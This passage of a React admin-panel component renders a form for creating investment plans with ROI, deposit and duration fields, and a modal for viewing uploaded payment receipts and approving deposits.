                  className="admin-input"
                  placeholder="e.g. 25% or 15-30%"
                  value={planForm.roi}
                  onChange={e => setPlanForm({ ...planForm, roi: e.target.value })}
                  required
                />
              </div>

              {/* Duration */}
              <div className="form-group">
                <label>Plan Duration</label>
                <select
                  className="admin-input"
                  value={planForm.duration}
                  onChange={e => setPlanForm({ ...planForm, duration: e.target.value })}
                  required
                >
                  <option value="" disabled hidden>Select duration</option>
                  <option value="1 day">1 Day</option>
                  <option value="3 days">3 Days</option>
                  <option value="1 week">1 Week</option>
                  <option value="2 weeks">2 Weeks</option>
                  <option value="1 month">1 Month</option>
                  <option value="2 months">2 Months</option>
                  <option value="3 months">3 Months</option>
                  <option value="6 months">6 Months</option>
                  <option value="1 year">1 Year</option>
                </select>
              </div>

              {/* Summary preview */}
              {planForm.name && (
                <div style={{ background: "rgba(226,255,59,0.07)", border: "1px solid rgba(226,255,59,0.2)", borderRadius: 8, padding: "12px 16px", marginBottom: 16, fontSize: 13 }}>
                  <div style={{ color: "#94a3b8", marginBottom: 4 }}>Plan Preview</div>
                  <div style={{ color: "#f8fafc", fontWeight: 700 }}>{planForm.name}</div>
                  <div style={{ color: "#94a3b8", marginTop: 4 }}>
                    {planForm.depositType === "fixed"
                      ? planForm.fixedAmount ? `Fixed: $${parseFloat(planForm.fixedAmount).toLocaleString()}` : ""
                      : (planForm.minDeposit && planForm.maxDeposit) ? `Range: $${parseFloat(planForm.minDeposit).toLocaleString()} - $${parseFloat(planForm.maxDeposit).toLocaleString()}` : ""}
                    {planForm.roi ? ` | ROI: ${planForm.roi}` : ""}
                    {planForm.duration ? ` | ${planForm.duration}` : ""}
                  </div>
                </div>
              )}

              <button type="submit" className="admin-btn admin-btn-primary" style={{ width: "100%", justifyContent: "center", marginTop: 4, padding: "12px", fontSize: 14 }}>
                <LucideIcon name="plus-circle" /> {activeModal === "newPlan" ? "Create Plan" : "Save Changes"}
              </button>
            </form>
          )}

          {/* View Receipt Modal */}
          {activeModal === "viewReceipt" && selectedReceipt && (
            <div>
              <div className="modal-header">
                <h3>Payment Receipt: {selectedReceipt.userName}</h3>
                <LucideIcon name="x" style={{ cursor: "pointer", color: "#94a3b8" }} onClick={closeModal} />
              </div>
              <div style={{ textAlign: "center", margin: "16px 0" }}>
                <div style={{ fontSize: "12px", color: "#94a3b8", marginBottom: "12px" }}>
                  File: {selectedReceipt.receiptName || "receipt.png"} | Amount: ${selectedReceipt.amount.toLocaleString()}
                </div>
                {selectedReceipt.receipt && selectedReceipt.receipt.startsWith("data:application/pdf") ? (
                  <div style={{ padding: "24px", background: "#1e293b", borderRadius: "8px", border: "1px solid #334155" }}>
                    <LucideIcon name="file-text" style={{ width: "48px", height: "48px", color: "#38bdf8", marginBottom: "12px", marginLeft: "auto", marginRight: "auto" }} />
                    <p style={{ fontSize: "13px", color: "#e2e8f0", marginBottom: "16px" }}>PDF Receipt Document</p>
                    <a href={selectedReceipt.receipt} download={selectedReceipt.receiptName || "receipt.pdf"} className="admin-btn admin-btn-primary" style={{ display: "inline-flex", margin: "0 auto" }}>
                      Download PDF Receipt
                    </a>
                  </div>
                ) : (
                  <div style={{ background: "#0f172a", padding: "10px", borderRadius: "8px", border: "1px solid #334155", display: "inline-block", maxWidth: "100%" }}>
                    <img 
                      src={selectedReceipt.receipt} 
                      alt="Payment Receipt" 
                      style={{ maxWidth: "100%", maxHeight: "350px", borderRadius: "4px", display: "block" }} 
                    />
                  </div>
                )}
              </div>
              <div style={{ display: "flex", gap: "12px", marginTop: "24px" }}>
                <a href={selectedReceipt.receipt} download={selectedReceipt.receiptName || "receipt.png"} className="admin-btn" style={{ background: "#334155", color: "#fff", flex: 1, justifyContent: "center" }}>
                  Download File
                </a>
                <button className="admin-btn admin-btn-success" style={{ flex: 1, justifyContent: "center" }} onClick={() => {
                  handleApproveTransaction(selectedReceipt.userId, selectedReceipt.id);
                  closeModal();
                }}>
                  Approve Deposit
                </button>
              </div>
            </div>
          )}

        </div>
      </div>
    </div>
  );
}
